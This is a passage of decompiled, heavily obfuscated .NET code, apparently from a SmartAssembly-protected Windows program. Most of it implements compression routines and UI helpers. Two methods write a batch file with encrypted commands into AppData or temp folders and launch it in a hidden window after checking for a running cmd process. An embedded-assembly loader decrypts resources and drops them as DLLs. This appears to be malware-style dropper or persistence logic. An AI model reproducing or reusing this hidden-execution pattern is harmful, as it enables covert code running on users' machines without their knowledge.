		while (int_0 >= 4)
		{
			num += 2;
			if (LDM65EyL5AHhD5120V())
			{
				switch (3)
				{
				case 0:
				case 3:
					break;
				default:
					continue;
				case 4:
					goto end_IL_0037;
				}
			}
			int_0 >>= 1;
			continue;
			end_IL_0037:
			break;
		}
		return num + int_0;
	}

	static int smethod_151(Class26.Class29 class29_0, Class26.Class28 class28_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class29_0.int_1), Class17.smethod_103(class28_0));
		int num = 32768 - class29_0.int_0;
		int num2;
		if (int_0 > num)
		{
			num2 = Class17.smethod_119(class28_0, class29_0.byte_0, class29_0.int_0, num);
			if (num2 == num)
			{
				num2 += Class17.smethod_119(class28_0, class29_0.byte_0, 0, int_0 - num);
			}
		}
		else
		{
			num2 = Class17.smethod_119(class28_0, class29_0.byte_0, class29_0.int_0, int_0);
		}
		class29_0.int_0 = (class29_0.int_0 + num2) & 0x7FFF;
		class29_0.int_1 += num2;
		return num2;
	}

	static void smethod_152(Class50 class50_0, Delegate15 delegate15_0)
	{
		if (class50_0.string_2 == null)
		{
			try
			{
				UploadReportLoginService uploadReportLoginService = new UploadReportLoginService();
				if (class50_0.iwebProxy_0 != null)
				{
					((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(class50_0.iwebProxy_0);
				}
				class50_0.string_2 = uploadReportLoginService.GetServerURL(class50_0.string_1);
				if (class50_0.string_2.Length == 0)
				{
					throw new ApplicationException("Cannot connect to webservice");
				}
				if (class50_0.string_2 == "ditto")
				{
					class50_0.string_2 = Class50.string_0;
				}
			}
			catch (Exception ex)
			{
				delegate15_0("ERR 2001: " + ex.Message);
				return;
			}
		}
		delegate15_0(class50_0.string_2.StartsWith("ERR") ? class50_0.string_2 : "OK");
	}

	static void smethod_153(Class26.Class28 class28_0)
	{
		class28_0.uint_0 >>= class28_0.int_2 & 7;
		class28_0.int_2 &= -8;
	}

	[DllImport("kernel32.dll")]
	internal static extern void GetSystemInfo(ref Class51.Struct17 struct17_0);

	static int smethod_154(Font font_0, string string_0, int int_0, Graphics graphics_0)
	{
		return Size.Ceiling(graphics_0.MeasureString(string_0, font_0, int_0)).Height;
	}

	static void smethod_155(Class26.Class30 class30_0, byte[] byte_0)
	{
		int[] array = new int[16];
		int num6 = default(int);
		int num9 = default(int);
		int num11 = default(int);
		int num12 = default(int);
		int num13 = default(int);
		int num15 = default(int);
		int num14 = default(int);
		int num17 = default(int);
		while (true)
		{
			int[] array2 = new int[16];
			while (true)
			{
				int num = 0;
				while (true)
				{
					if (num < byte_0.Length)
					{
						int num2 = byte_0[num];
						if (num2 > 0)
						{
							array[num2]++;
						}
						num++;
						continue;
					}
					while (true)
					{
						int num3 = 0;
						int num4 = 512;
						int num5 = 1;
						while (true)
						{
							if (num5 <= 15)
							{
								array2[num5] = num3;
								num3 += array[num5] << 16 - num5;
								if (num5 < 10)
								{
									goto IL_0081;
								}
								num6 = array2[num5] & 0x1FF80;
							}
							else
							{
								while (true)
								{
									class30_0.short_0 = new short[num4];
									int num7 = 512;
									int num8 = 15;
									while (true)
									{
										if (num8 >= 10)
										{
											num9 = num3 & 0x1FF80;
											num3 -= array[num8] << 16 - num8;
											goto IL_00a8;
										}
										int num10 = 9;
										if (oLMEnfKBTsIqRDPCqp())
										{
											break;
										}
										while (true)
										{
											switch (num10)
											{
											case 10:
												break;
											case 1:
												goto IL_00a8;
											case 5:
											case 7:
												goto IL_00e2;
											default:
												num10 = 1;
												if (LDM65EyL5AHhD5120V())
												{
													continue;
												}
												goto end_IL_0179;
											case 8:
												goto end_IL_0153;
											case 4:
												goto end_IL_0179;
											case 2:
											case 11:
												goto end_IL_0185;
											case 13:
												goto end_IL_0194;
											case 12:
												goto end_IL_01a0;
											case 9:
												num11 = 0;
												goto case 14;
											case 6:
												if (num12 <= 9)
												{
													do
													{
														class30_0.short_0[num13] = (short)((num11 << 4) | num12);
														num13 += 1 << num12;
													}
													while (num13 < 512);
													goto case 0;
												}
												num14 = class30_0.short_0[num13 & 0x1FF];
												num15 = 1 << (num14 & 0xF);
												num14 = -(num14 >> 4);
												goto case 3;
											case 3:
												do
												{
													class30_0.short_0[num14 | (num13 >> 9)] = (short)((num11 << 4) | num12);
													num13 += 1 << num12;
												}
												while (num13 < num15);
												goto case 0;
											case 0:
												array2[num12] = num3 + (1 << 16 - num12);
												goto IL_024a;
											case 14:
												{
													if (num11 < byte_0.Length)
													{
														num12 = byte_0[num11];
														if (num12 != 0)
														{
															num3 = array2[num12];
															num13 = Class17.smethod_120(num3);
															goto case 6;
														}
														goto IL_024a;
													}
													return;
												}
												IL_024a:
												num11++;
												goto case 14;
											}
											break;
										}
										goto end_IL_015f;
										IL_00a8:
										int num16 = num3 & 0x1FF80;
										num17 = num16;
										goto IL_00b6;
										IL_00e2:
										num17 += 128;
										goto IL_00b6;
										IL_00b6:
										if (num17 < num9)
										{
											class30_0.short_0[Class17.smethod_120(num17)] = (short)((-num7 << 4) | num8);
											num7 += 1 << num8 - 9;
											goto IL_00e2;
										}
										num8--;
										continue;
										end_IL_0153:
										break;
									}
									continue;
									end_IL_015f:
									break;
								}
							}
							int num18 = num3 & 0x1FF80;
							num4 += num18 - num6 >> 16 - num5;
							goto IL_0081;
							IL_0081:
							num5++;
							continue;
							end_IL_0179:
							break;
						}
						continue;
						end_IL_0185:
						break;
					}
					continue;
					end_IL_0194:
					break;
				}
				continue;
				end_IL_01a0:
				break;
			}
		}
	}

	static string smethod_156()
	{
		try
		{
			return Application.get_ExecutablePath();
		}
		catch
		{
			return "N/A";
		}
	}

	static void smethod_157(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7)
	{
		Class17.smethod_128(exception_0, new object[8] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7 });
	}

	static void smethod_158()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				string text4;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 829:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_0047;
						case 5:
							goto IL_0069;
						case 6:
							goto IL_0086;
						case 7:
							goto IL_0098;
						case 8:
							goto IL_00e4;
						case 9:
							goto IL_00ef;
						case 10:
							goto IL_0104;
						case 11:
							goto IL_0114;
						case 12:
							goto IL_0124;
						case 13:
							goto IL_0134;
						case 14:
							goto IL_0149;
						case 15:
							goto IL_0159;
						case 16:
							goto IL_016e;
						case 17:
							goto IL_017e;
						case 18:
							goto IL_018e;
						case 19:
							goto IL_019e;
						case 20:
							goto IL_01c1;
						case 21:
							goto IL_0217;
						case 22:
							goto IL_0227;
						case 23:
							goto IL_023c;
						case 24:
							goto IL_024c;
						case 25:
							goto IL_025c;
						case 26:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 27:
						case 28:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_025c:
					num = 25;
					streamWriter.Dispose();
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
					goto IL_002a;
					IL_002a:
					num = 3;
					text2 = Interaction.Environ(Class17.smethod_86("rRhnphBugUiRcVlpVgLfjw==")) + "\\temp\\";
					goto IL_0047;
					IL_0047:
					num = 4;
					text3 = Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_0069;
					IL_0069:
					num = 5;
					File.Delete(text + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\qJ1rx6zo0JWv6cXezCyOGQ==.bat");
					goto IL_0086;
					IL_0086:
					num = 6;
					if (Class17.smethod_30("cmd"))
					{
						goto end_IL_0000_3;
					}
					goto IL_0098;
					IL_0098:
					num = 7;
					streamWriter = new StreamWriter(text + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") + ".bat");
					goto IL_00e4;
					IL_00e4:
					num = 8;
					streamWriter.AutoFlush = true;
					goto IL_00ef;
					IL_00ef:
					num = 9;
					streamWriter.Write(Class17.smethod_86("31RKsOSvI9/AFuhKog3NgA=="));
					goto IL_0104;
					IL_0104:
					num = 10;
					streamWriter.Write(Environment.NewLine);
					goto IL_0114;
					IL_0114:
					num = 11;
					streamWriter.Write("timeout /t 300");
					goto IL_0124;
					IL_0124:
					num = 12;
					streamWriter.Write(Environment.NewLine);
					goto IL_0134;
					IL_0134:
					num = 13;
					streamWriter.Write(Class17.smethod_86("sVCCMiKQCYeTpQSTFrz5DDm67Dq62ySggzNsI52ecP+zGW0ndTihzBH1ezwpAZMgAvZ0FwJEcI2azy08gnzpoj7dAR2hAZCAqGoM2t38QMc="));
					goto IL_0149;
					IL_0149:
					num = 14;
					streamWriter.Write(Environment.NewLine);
					goto IL_0159;
					IL_0159:
					num = 15;
					streamWriter.Write(Class17.smethod_86("OHLI5dgL1wwNBGr/QEZ9WA=="));
					goto IL_016e;
					IL_016e:
					num = 16;
					streamWriter.Write(Environment.NewLine);
					goto IL_017e;
					IL_017e:
					num = 17;
					streamWriter.Write(") || (");
					goto IL_018e;
					IL_018e:
					num = 18;
					streamWriter.Write(Environment.NewLine);
					goto IL_019e;
					IL_019e:
					num = 19;
					text4 = "%appdata%\\" + Class17.smethod_86("iXIzM98Pjl/u+zlU/h5Dfl19cMP29BJLIWFLWajNT92OKqOYE9q1PcctiVmnH8Ed") + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==");
					goto IL_01c1;
					IL_01c1:
					num = 20;
					streamWriter.Write(" Start /W \"\" \"" + text + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") + "\"");
					goto IL_0217;
					IL_0217:
					num = 21;
					streamWriter.Write(Environment.NewLine);
					goto IL_0227;
					IL_0227:
					num = 22;
					streamWriter.Write(Class17.smethod_86("OHLI5dgL1wwNBGr/QEZ9WA=="));
					goto IL_023c;
					IL_023c:
					num = 23;
					streamWriter.Write(Environment.NewLine);
					goto IL_024c;
					IL_024c:
					num = 24;
					streamWriter.Write(")");
					goto IL_025c;
					end_IL_0000_2:
					break;
				}
				num = 26;
				Interaction.Shell(text + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") + ".bat", (AppWinStyle)0, false, -1);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 829;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static SecurityException smethod_159(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.securityException_0;
	}

	static void smethod_160(int int_0, bool bool_0, int int_1, Class26.Class33 class33_0, byte[] byte_0)
	{
		Class17.smethod_174(class33_0.class36_0, bool_0 ? 1 : 0, 3);
		while (true)
		{
			Class17.smethod_102(class33_0.class36_0);
			Class17.smethod_25(int_0, class33_0.class36_0);
			while (true)
			{
				Class17.smethod_25(~int_0, class33_0.class36_0);
				while (true)
				{
					Class17.smethod_110(int_0, byte_0, class33_0.class36_0, int_1);
					if (LDM65EyL5AHhD5120V())
					{
						switch (5)
						{
						case 1:
						case 2:
							goto end_IL_0015;
						case 0:
						case 4:
							goto end_IL_004f;
						case 5:
							goto IL_0078;
						}
						continue;
					}
					goto IL_0078;
					IL_0078:
					Class17.smethod_20(class33_0);
					return;
					continue;
					end_IL_0015:
					break;
				}
				continue;
				end_IL_004f:
				break;
			}
		}
	}

	static Type smethod_161(Class44 class44_0)
	{
		return class44_0.type_0;
	}

	static void smethod_162(Class48 class48_0, EventHandler eventHandler_0)
	{
		EventHandler eventHandler = class48_0.eventHandler_0;
		EventHandler eventHandler2;
		do
		{
			eventHandler2 = eventHandler;
			EventHandler value = (EventHandler)Delegate.Combine(eventHandler2, eventHandler_0);
			eventHandler = Interlocked.CompareExchange(ref class48_0.eventHandler_0, value, eventHandler2);
		}
		while ((object)eventHandler != eventHandler2);
	}

	static Assembly smethod_163(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		Class20.Struct5 @struct = new Class20.Struct5(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "e2M1ZTliMjQ3LWZhOWUtNDEwZS05OTI2LTdlNGM4NWJkYTI4ZX0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{bfa12dd0-5a09-4d29-bddc-922bbc8bc5c2},e2M1ZTliMjQ3LWZhOWUtNDEwZS05OTI2LTdlNGM4NWJkYTI4ZX0=,[z]{bfa12dd0-5a09-4d29-bddc-922bbc8bc5c2}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		for (int i = 0; i < array.Length - 1; i += 2)
		{
			if (array[i] == text)
			{
				text2 = array[i + 1];
				break;
			}
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			for (int j = 0; j < array.Length - 1; j += 2)
			{
				if (array[j] == text)
				{
					text2 = array[j + 1];
					break;
				}
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				int num = text2.IndexOf(']');
				string text3 = text2.Substring(1, num - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(num + 1);
			}
			Assembly result;
			lock (Class20.dictionary_0)
			{
				if (Class20.dictionary_0.ContainsKey(text2))
				{
					result = Class20.dictionary_0[text2];
				}
				else
				{
					Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
					if (manifestResourceStream == null)
					{
						goto IL_0265;
					}
					int num2 = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[num2];
					manifestResourceStream.Read(array2, 0, num2);
					if (flag)
					{
						array2 = Class17.smethod_62(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								MoveFileEx(text5, null, 4);
								MoveFileEx(text4, null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class20.dictionary_0[text2] = assembly;
					result = assembly;
				}
			}
			return result;
		}
		goto IL_0265;
		IL_0265:
		return null;
	}

	static void smethod_164(bool bool_0, EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_3 = bool_0;
	}

	static int smethod_165(string string_0, int int_0, Graphics graphics_0, Font font_0)
	{
		try
		{
			return Class17.smethod_5(font_0, graphics_0, string_0, int_0);
		}
		catch (Exception)
		{
			try
			{
				return Convert.ToInt32((double)Class17.smethod_154(font_0, string_0, int_0, graphics_0) * 1.1);
			}
			catch (Exception)
			{
			}
		}
		return 0;
	}

	static string smethod_166(Class39.Class43 class43_0)
	{
		return class43_0.string_2;
	}

	static void smethod_167(Class26.Class28 class28_0, int int_0)
	{
		class28_0.uint_0 >>= int_0;
		class28_0.int_2 -= int_0;
	}

	static void smethod_168(int int_0, Class26.Class33 class33_0, int int_1, byte[] byte_0, bool bool_0)
	{
		class33_0.class34_0.short_0[256]++;
		int num3 = default(int);
		short[] short_ = default(short[]);
		Class26.Class33.Class34 class34_ = default(Class26.Class33.Class34);
		int num5 = default(int);
		byte[] byte_ = default(byte[]);
		while (true)
		{
			Class17.smethod_181(class33_0.class34_0);
			while (true)
			{
				Class17.smethod_181(class33_0.class34_1);
				while (true)
				{
					Class17.smethod_67(class33_0.class34_0, class33_0.class34_2);
					Class17.smethod_67(class33_0.class34_1, class33_0.class34_2);
					Class17.smethod_181(class33_0.class34_2);
					int num = 4;
					int num2 = 18;
					while (true)
					{
						if (num2 > num)
						{
							if (class33_0.class34_2.byte_0[Class26.Class33.int_0[num2]] > 0)
							{
								goto IL_016c;
							}
							goto IL_0170;
						}
						num3 = 14 + num * 3 + Class17.smethod_129(class33_0.class34_2) + Class17.smethod_129(class33_0.class34_0) + Class17.smethod_129(class33_0.class34_1) + class33_0.int_2;
						goto IL_00c0;
						IL_0052:
						Class17.smethod_36(byte_, short_, class34_);
						class34_ = class33_0.class34_1;
						short_ = Class26.Class33.short_2;
						int num4 = 9;
						if (!LDM65EyL5AHhD5120V())
						{
							continue;
						}
						goto IL_012a;
						IL_007d:
						if (num3 >= num5)
						{
							num3 = num5;
						}
						if (int_1 < 0 || int_0 + 4 >= num3 >> 3)
						{
							if (num3 == num5)
							{
								Class17.smethod_174(class33_0.class36_0, 2 + (bool_0 ? 1 : 0), 3);
								class34_ = class33_0.class34_0;
								goto IL_0046;
							}
							Class17.smethod_174(class33_0.class36_0, 4 + (bool_0 ? 1 : 0), 3);
							Class17.smethod_40(class33_0, num);
							Class17.smethod_4(class33_0);
							goto IL_0269;
						}
						Class17.smethod_160(int_0, bool_0, int_1, class33_0, byte_0);
						return;
						IL_0170:
						num2--;
						num4 = 4;
						if (!oLMEnfKBTsIqRDPCqp())
						{
							goto IL_012a;
						}
						goto IL_024c;
						IL_012a:
						switch (num4)
						{
						case 8:
						case 12:
							break;
						case 1:
							goto IL_0052;
						case 2:
							goto IL_007d;
						default:
							goto IL_00c0;
						case 6:
							goto IL_016c;
						case 7:
							goto IL_0170;
						case 4:
						case 5:
							continue;
						case 11:
							goto end_IL_01c0;
						case 3:
							goto end_IL_01c9;
						case 10:
							goto end_IL_01fd;
						case 9:
							goto IL_024c;
						case 13:
							goto IL_0269;
						}
						goto IL_0046;
						IL_024c:
						byte_ = Class26.Class33.byte_3;
						Class17.smethod_36(byte_, short_, class34_);
						Class17.smethod_4(class33_0);
						Class17.smethod_20(class33_0);
						return;
						IL_016c:
						num = num2 + 1;
						goto IL_0170;
						IL_00c0:
						num5 = class33_0.int_2;
						for (int i = 0; i < 286; i++)
						{
							num5 += class33_0.class34_0.short_0[i] * Class26.Class33.byte_2[i];
						}
						for (int j = 0; j < 30; j++)
						{
							num5 += class33_0.class34_1.short_0[j] * Class26.Class33.byte_3[j];
						}
						goto IL_007d;
						IL_0046:
						short_ = Class26.Class33.short_1;
						byte_ = Class26.Class33.byte_2;
						goto IL_0052;
						IL_0269:
						Class17.smethod_20(class33_0);
						return;
						continue;
						end_IL_01c0:
						break;
					}
					continue;
					end_IL_01c9:
					break;
				}
				continue;
				end_IL_01fd:
				break;
			}
		}
	}

	static bool smethod_169(Class26.Class33 class33_0)
	{
		return class33_0.int_1 >= 16384;
	}

	static void smethod_170(bool bool_0, Control3 control3_0)
	{
		if (LDM65EyL5AHhD5120V())
		{
			switch (4)
			{
			case 4:
				control3_0.timer_0.set_Enabled(bool_0);
				break;
			case 1:
			case 3:
				break;
			default:
				goto IL_0041;
			case 5:
				return;
			}
		}
		control3_0.int_0 = 0;
		goto IL_0041;
		IL_0041:
		((Control)control3_0).Refresh();
	}

	static string smethod_171(Class39.Class43 class43_0)
	{
		return class43_0.string_0;
	}

	static void smethod_172(Class26.Class32 class32_0, byte[] byte_0)
	{
		Class17.smethod_90(class32_0.class35_0, byte_0);
	}

	static int smethod_173(Class26.Class35 class35_0)
	{
		int num = ((class35_0.int_0 << 5) ^ class35_0.byte_0[class35_0.int_4 + 2]) & 0x7FFF;
		int num2 = 2;
		if (!oLMEnfKBTsIqRDPCqp())
		{
		}
		short num3 = default(short);
		while (true)
		{
			switch (num2)
			{
			case 1:
			case 3:
				class35_0.int_0 = num;
				num2 = 4;
				if (oLMEnfKBTsIqRDPCqp())
				{
				}
				continue;
			case 0:
			case 2:
				num3 = (class35_0.short_1[class35_0.int_4 & 0x7FFF] = class35_0.short_0[num]);
				class35_0.short_0[num] = (short)class35_0.int_4;
				goto case 1;
			default:
				num2 = 3;
				if (LDM65EyL5AHhD5120V())
				{
					continue;
				}
				break;
			case 4:
				break;
			}
			break;
		}
		return num3 & 0xFFFF;
	}

	static void smethod_174(Class26.Class36 class36_0, int int_0, int int_1)
	{
		class36_0.uint_0 |= (uint)(int_0 << class36_0.int_2);
		class36_0.int_2 += int_1;
		if (class36_0.int_2 >= 16)
		{
			class36_0.byte_0[class36_0.int_1++] = (byte)class36_0.uint_0;
			class36_0.byte_0[class36_0.int_1++] = (byte)(class36_0.uint_0 >> 8);
			class36_0.uint_0 >>= 16;
			class36_0.int_2 -= 16;
		}
	}

	static int smethod_175(Class26.Class28 class28_0)
	{
		return class28_0.int_2;
	}

	static void smethod_176(Exception exception_0)
	{
		Class17.smethod_128(exception_0, new object[0]);
	}

	static void smethod_177(string string_0, Control0 control0_0)
	{
		while (true)
		{
			control0_0.string_0 = string_0;
			while (true)
			{
				control0_0.timer_0.set_Enabled(false);
				control0_0.image_0 = (Image)(object)Class17.smethod_9((string_0.Length <= 0) ? "ok" : "error");
				if (!LDM65EyL5AHhD5120V())
				{
					return;
				}
				switch (4)
				{
				case 1:
				case 2:
					continue;
				case 0:
				case 5:
					break;
				case 4:
					control0_0.bool_1 = true;
					control0_0.bool_0 = true;
					if (string_0.Length > 0)
					{
						((Control)control0_0).set_Height(100);
					}
					goto default;
				default:
					((Control)control0_0).Refresh();
					return;
				case 6:
					return;
				}
				break;
			}
		}
	}

	static void smethod_178()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				string text3;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 228:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_004c;
						case 5:
							goto IL_0055;
						case 6:
							goto IL_0064;
						case 7:
							goto IL_0082;
						case 8:
							goto IL_008c;
						case 9:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_008c:
					num = 8;
					processStartInfo.CreateNoWindow = true;
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_002a;
					IL_002a:
					num = 3;
					text2 = Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
					goto IL_004c;
					IL_004c:
					num = 4;
					text3 = "cm";
					goto IL_0055;
					IL_0055:
					num = 5;
					if (Class17.smethod_30("cmd"))
					{
						goto end_IL_0000_3;
					}
					goto IL_0064;
					IL_0064:
					num = 6;
					processStartInfo = new ProcessStartInfo(text2 + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\qJ1rx6zo0JWv6cXezCyOGQ==.bat");
					goto IL_0082;
					IL_0082:
					num = 7;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					goto IL_008c;
					end_IL_0000_2:
					break;
				}
				num = 9;
				Process.Start(processStartInfo);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 228;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_179(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_1;
	}

	static byte[] smethod_180(string string_0, byte[] byte_0)
	{
		checked
		{
			byte[] array = new byte[byte_0.Length + 1];
			int num4 = default(int);
			while (true)
			{
				int num = byte_0[byte_0.Length - 1] ^ 0x70;
				byte[] bytes = Encoding.Default.GetBytes(string_0);
				int num2 = byte_0.Length - 1;
				int num3 = 0;
				while (true)
				{
					if (num3 <= num2)
					{
						array[num3] = (byte)(byte_0[num3] ^ num ^ bytes[num4]);
						num4 = ((num4 != string_0.Length - 1) ? (num4 + 1) : 0);
						while (true)
						{
							num3++;
							if (oLMEnfKBTsIqRDPCqp())
							{
							}
							switch (5)
							{
							case 5:
								goto end_IL_0033;
							case 0:
							case 4:
								goto end_IL_0066;
							case 6:
								goto IL_00ab;
							}
							continue;
							end_IL_0033:
							break;
						}
						continue;
					}
					array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[byte_0.Length - 2 + 1]);
					goto IL_00ab;
					IL_00ab:
					return array;
					continue;
					end_IL_0066:
					break;
				}
			}
		}
	}

	static void smethod_181(Class26.Class33.Class34 class34_0)
	{
		int num = class34_0.short_0.Length;
		int[] array = new int[num];
		int num2 = 0;
		int num3 = 0;
		for (int i = 0; i < num; i++)
		{
			int num4 = class34_0.short_0[i];
			if (num4 != 0)
			{
				int num5 = num2++;
				int num6;
				while (num5 > 0 && class34_0.short_0[array[num6 = (num5 - 1) / 2]] > num4)
				{
					array[num5] = array[num6];
					num5 = num6;
				}
				array[num5] = i;
				num3 = i;
			}
		}
		while (num2 < 2)
		{
			int num7 = ((num3 < 2) ? (++num3) : 0);
			array[num2++] = num7;
		}
		class34_0.int_1 = Math.Max(num3 + 1, class34_0.int_0);
		int num8 = num2;
		int[] array2 = new int[4 * num2 - 2];
		int[] array3 = new int[2 * num2 - 1];
		int num9 = num8;
		for (int j = 0; j < num2; j++)
		{
			int num10 = (array2[2 * j] = array[j]);
			array2[2 * j + 1] = -1;
			array3[j] = class34_0.short_0[num10] << 8;
			array[j] = j;
		}
		do
		{
			int num11 = array[0];
			int num12 = array[--num2];
			int num13 = 0;
			int num14;
			for (num14 = 1; num14 < num2; num14 = num14 * 2 + 1)
			{
				if (num14 + 1 < num2 && array3[array[num14]] > array3[array[num14 + 1]])
				{
					num14++;
				}
				array[num13] = array[num14];
				num13 = num14;
			}
			int num15 = array3[num12];
			while ((num14 = num13) > 0 && array3[array[num13 = (num14 - 1) / 2]] > num15)
			{
				array[num14] = array[num13];
			}
			array[num14] = num12;
			int num16 = array[0];
			num12 = num9++;
			array2[2 * num12] = num11;
			array2[2 * num12 + 1] = num16;
			int num17 = Math.Min(array3[num11] & 0xFF, array3[num16] & 0xFF);
			num15 = (array3[num12] = array3[num11] + array3[num16] - num17 + 1);
			num13 = 0;
			for (num14 = 1; num14 < num2; num14 = num13 * 2 + 1)
			{
				if (num14 + 1 < num2 && array3[array[num14]] > array3[array[num14 + 1]])
				{
					num14++;
				}
				array[num13] = array[num14];
				num13 = num14;
			}
			while ((num14 = num13) > 0 && array3[array[num13 = (num14 - 1) / 2]] > num15)
			{
				array[num14] = array[num13];
			}
			array[num14] = num12;
		}
		while (num2 > 1);
		Class17.smethod_94(class34_0, array2);
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_6([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static string smethod_182()
	{
		return "SmartAssembly";
	}

	static void smethod_183(Class39 class39_0, Enum1 enum1_0, string string_0)
	{
		Class17.smethod_186(class39_0, enum1_0, string_0, string.Empty);
	}

	static bool smethod_184(Class26.Class31 class31_0, Class26.Class28 class28_0)
	{
		bool result = default(bool);
		int num4 = default(int);
		while (true)
		{
			IL_0000:
			int int_ = class31_0.int_2;
			int num = 12;
			if (!LDM65EyL5AHhD5120V())
			{
				goto IL_01ed;
			}
			goto IL_0299;
			IL_0299:
			while (true)
			{
				int int_2;
				int num2;
				int num3;
				switch (num)
				{
				case 15:
					if (class31_0.int_8 == class31_0.int_6)
					{
						result = true;
						goto end_IL_0000;
					}
					goto IL_0058;
				case 2:
				case 10:
					goto IL_0058;
				case 1:
					class31_0.int_2 = 5;
					goto IL_0093;
				case 0:
					goto IL_0093;
				case 5:
					class31_0.int_6 = class31_0.int_3 + class31_0.int_4;
					goto case 3;
